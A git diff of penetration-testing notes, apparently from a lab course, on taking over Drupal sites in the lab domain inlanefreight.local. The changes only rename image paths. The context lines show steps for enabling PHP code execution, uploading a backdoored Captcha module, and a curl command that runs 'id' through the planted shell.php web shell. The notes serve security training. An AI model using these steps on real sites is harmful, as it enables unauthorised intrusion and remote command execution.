@@ -26,7 +26,7 @@ droopescan scan drupal -u http://drupal-qa.inlanefreight.local
 http://drupal-qa.inlanefreight.local/#overlay=admin/modules
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 * From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.
 
@@ -34,7 +34,7 @@ http://drupal-qa.inlanefreight.local/#overlay=admin/modules
 http://drupal-qa.inlanefreight.local/#overlay=node/add
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 <?php
@@ -61,7 +61,7 @@ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 http://drupal.inlanefreight.local/admin/reports/updates/install
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 * From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.
 * Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.
@@ -109,7 +109,7 @@ tar cvf captcha.tar.gz captcha/
   * Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install`&#x20;
   * Browse to the backdoored Captcha archive and click `Install`.
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 ```shell-session
 curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
